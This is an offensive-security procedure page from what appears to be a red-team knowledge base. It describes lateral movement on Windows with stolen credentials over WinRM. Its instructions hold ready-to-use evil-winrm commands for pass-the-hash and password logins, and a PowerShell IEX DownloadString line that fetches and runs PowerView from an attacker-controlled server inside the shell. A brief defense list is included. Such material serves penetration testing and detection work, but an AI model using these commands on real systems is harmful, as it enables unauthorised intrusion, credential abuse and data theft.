---
type: procedure
description: >-
  Use valid credentials to establish a remote shell on a Windows target via
  WinRM protocol for lateral movement and access to sensitive data.
verified: true
submitted: false
tactics:
  - '[[tactics/Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
  - '[[techniques/Remote Services|T1021 - Remote Services]]'
sub_techniques: []
tags:
  - '[[tags/Windows - Using credentials]]'
  - '[[tags/WinRM Protocol]]'
commands:
  - '[[commands/winrm-quickconfig-enable]]'
  - '[[commands/evil-winrm-connect-with-ntlm-hash]]'
  - '[[commands/evil-winrm-connect-with-password-and-realm]]'
  - '[[commands/evil-winrm-general-connect]]'
  - '[[commands/powershell-iex-download-powerview]]'
platforms:
  - Windows
tools:
  - '[[tools/Evil-WinRM]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
validated: true
---

# windows-winrm-credential-access

## Summary

This procedure demonstrates how to use valid credentials to access a remote Windows machine via the Windows Remote Management (WinRM) protocol, enabling a remote shell for executing commands, file transfers, and lateral movement within a network. It covers enabling WinRM if necessary and connecting using tools like evil-winrm with various authentication methods such as NTLM hashes or passwords.

## Description

WinRM is Microsoft's implementation of WS-Management protocol, allowing remote management of Windows systems over HTTP/HTTPS. Attackers with stolen credentials can leverage WinRM for lateral movement without needing physical access, executing PowerShell commands remotely to exfiltrate data, escalate privileges, or pivot to other systems. This technique is common in Active Directory environments where WinRM is enabled on domain-joined machines. The procedure assumes the attacker has obtained credentials through prior techniques like credential dumping. Once connected, the attacker gains an interactive shell similar to PowerShell remoting. Note that enabling WinRM (step 1) typically requires initial local or administrative access to the target; if WinRM is already configured, skip to connection steps. This maps to MITRE ATT&CK for remote service execution in lateral movement scenarios.

## Requirements

1. Valid domain or local credentials (username, password, or NTLM hash) for the target Windows machine.
2. Network access to the target over TCP port 5985 (HTTP) or 5986 (HTTPS); firewall must allow WinRM traffic.
3. evil-winrm tool installed on the attacker's machine (Ruby-based, supports multiple auth methods).
4. For enabling WinRM: Administrative privileges on the target (local or remote via other means like SMBExec).
5. PowerShell execution policy allowing remote scripts if downloading additional tools like PowerView.

## Defense

- Disable WinRM on non-essential systems or restrict it to trusted IPs via Group Policy (winrm set winrm/config/service @{AllowUnencrypted="false"}).
- Enforce least privilege: Use Just Enough Administration (JEA) to limit WinRM sessions to read-only or specific cmdlets.
- Monitor WinRM logs (Event ID 91/92 in Security log) and network traffic for unusual connections to port 5985/5986 using tools like Sysmon or EDR.
- Implement multi-factor authentication (MFA) for all accounts to prevent credential reuse.
- Use certificate-based authentication for WinRM instead of NTLM/passwords to reduce hash/pwd exposure.

## Objectives

1. Establish a remote interactive shell on the target Windows machine using stolen credentials.
2. Execute commands remotely to access sensitive information or perform post-exploitation tasks.
3. Enable lateral movement within the network by pivoting from the compromised host.

## Instructions

### Step 1: Enable WinRM on the Target

**Context**: If WinRM is not already configured on the target, enable it to allow remote management. This step requires administrative access to the target, often gained via initial compromise or SMB. Run this on the target machine to set up the listener and open firewall ports.

**Command** ([[commands/winrm-quickconfig-enable]]):
```cmd
winrm quickconfig
```

> This command prompts for confirmation and configures the WinRM service to start automatically, creates a listener on HTTP://* (port 5985), and enables the firewall exception. Expected output includes "WinRM has been updated for remote management" and confirmation of firewall changes. Verify with "winrm enumerate winrm/config/listener" to see active listeners. If HTTPS is preferred, follow up with "winrm create winrm/config/Listener?Address=*+Transport=HTTPS @{Hostname="target-hostname";CertificateThumbprint="thumbprint"}".

### Step 2: Connect Using NTLM Hash Authentication

**Context**: Use an obtained NTLM hash (e.g., from Mimikatz or LSASS dump) to authenticate without the plaintext password, avoiding password spraying detection. This is useful for pass-the-hash attacks in lateral movement.

**Command** ([[commands/evil-winrm-connect-with-ntlm-hash]]):
```bash
evil-winrm -i $_TARGET_IP -u $_USERNAME -H $_NTLM_HASH
```

> Replace placeholders with actual values (e.g., -i 10.0.0.20 -u administrator -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0). Expected output: Successful connection message like "Evil-WinRM shell vX.X.X" followed by a PowerShell prompt (*Evil-WinRM* PS C:\Users\Administrator>). If connection fails, check WinRM service status with "winrm get winrm/config" on target.

### Step 3: Connect Using Password and Realm

**Context**: Authenticate with plaintext password and domain realm for domain accounts. This method is straightforward but riskier due to password logging potential.

**Command** ([[commands/evil-winrm-connect-with-password-and-realm]]):
```bash
evil-winrm -i $_TARGET_IP -u $_USERNAME -p $_PASSWORD -r $_REALM
```

> Example: evil-winrm -i 10.0.0.20 -u administrator -p Summer19 -r domain.local. Expected output: Interactive shell prompt upon success. Use -S flag for SSL if HTTPS listener is configured (port 5986). Test connectivity first with "Test-WSMan -ComputerName target-ip" from PowerShell on attacker machine.

### Step 4: Advanced Connection Options

**Context**: For complex scenarios, use the full evil-winrm syntax to specify scripts/executables paths, SSL, or key-based auth. This allows uploading tools to the target for further exploitation.

**Command** ([[commands/evil-winrm-general-connect]]):
```bash
evil-winrm -i $_TARGET_IP -u $_USERNAME [-s $_SCRIPTS_PATH] [-e $_EXES_PATH] [-P $_PORT] [-p $_PASSWORD] [-H $_NTLM_HASH] [-U $_URL] [-S] [-c $_PUBLIC_KEY_PATH] [-k $_PRIVATE_KEY_PATH] [-r $_REALM]
```

> Customize based on needs; e.g., add -s /path/to/scripts for uploading PowerShell scripts. Expected output: Shell access with upload/download capabilities enabled. Once connected, you can run local scripts with "local-do script.ps1" or download files with "download file.txt".

### Step 5: Download and Execute PowerView in the Shell

**Context**: After gaining the shell, download and execute reconnaissance tools like PowerView for Active Directory enumeration. This extends the session for discovery without additional transfers.

**Command** ([[commands/powershell-iex-download-powerview]]):
```powershell
IEX([Net.WebClient]::new().DownloadString("$_URL/PowerView.ps1"))
```

> Run this inside the evil-winrm shell (e.g., *Evil-WinRM* PS > IEX(...)). Replace $_URL with attacker-controlled server (e.g., http://attacker-ip:8000/PowerView.ps1). Expected output: PowerView functions loaded (no visible output, but test with Get-NetDomain). This bypasses execution policies if AMSI is not blocking.
